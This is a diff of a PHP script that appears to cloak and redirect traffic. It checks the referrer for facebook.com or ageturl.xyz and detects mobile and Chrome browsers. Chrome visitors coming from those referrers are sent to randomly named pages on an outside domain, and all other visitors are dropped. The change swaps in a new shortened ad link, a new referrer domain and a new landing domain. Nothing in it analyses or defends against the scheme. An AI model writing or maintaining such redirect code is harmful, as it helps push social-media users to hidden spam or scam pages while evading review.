@@ -17,7 +17,7 @@ require_once('Mobile_Detect.php');
 require_once('Browser.php');
 $detect = new Mobile_Detect;
 $browser = new Browser();
-$ads = "http://goo.gl/c1u740";
+$ads = "http://goo.gl/y8tIUR";
 $isref = false;
 $filename = generate_name(rand(5,8)).".html";
 if(!isset($_SERVER["HTTP_REFERER"])){
@@ -26,7 +26,7 @@ if(!isset($_SERVER["HTTP_REFERER"])){
 if (strpos($_SERVER["HTTP_REFERER"], 'facebook.com') !== false){
     $isref = true;
 }
-if (strpos($_SERVER["HTTP_REFERER"], 'uye.io') !== false){
+if (strpos($_SERVER["HTTP_REFERER"], 'ageturl.xyz') !== false){
     $isref = true;
 }
 if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
@@ -60,7 +60,7 @@ if($detect->isMobile() || $browser->isMobile()){
   exit();
 }else if($browser->getBrowser() == Browser::BROWSER_CHROME){
   if($isref == true){
-    header("Location:http://".generate_name(rand(5,6)).".inak.us/".$filename);
+    header("Location:http://denizpelidihaberi.com/".$filename);
   }else{
     exit();
   }
